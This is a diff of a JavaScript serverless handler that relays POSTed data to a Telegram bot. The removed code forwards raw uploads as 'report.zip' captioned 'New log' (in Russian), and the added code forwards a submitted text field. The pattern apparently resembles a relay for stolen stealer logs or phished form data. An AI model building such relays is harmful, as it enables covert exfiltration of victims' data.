@@ -1,9 +1,3 @@
-export const config = {
-  api: {
-    bodyParser: false,
-  },
-};
-
 export default async function handler(req, res) {
   if (req.method !== "POST") {
     return res.status(405).send("Method Not Allowed");
@@ -13,18 +7,24 @@ export default async function handler(req, res) {
   const CHAT_ID = "-5332686054";
 
   try {
-    const chunks = [];
+    // Парсим текст из запроса (x-www-form-urlencoded)
+    let body = "";
     for await (const chunk of req) {
-      chunks.push(chunk);
+      body += chunk.toString();
     }
-    const buffer = Buffer.concat(chunks);
-    
+    const params = new URLSearchParams(body);
+    const text = params.get("text");
+
+    if (!text) {
+      return res.status(400).send("No text provided");
+    }
+
+    // Отправляем текст в Telegram
     const tgFormData = new FormData();
     tgFormData.append("chat_id", CHAT_ID);
-    tgFormData.append("document", new Blob([buffer], { type: "application/zip" }), "report.zip");
-    tgFormData.append("caption", "Новый лог");
+    tgFormData.append("text", text);
 
-    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       body: tgFormData,
     });
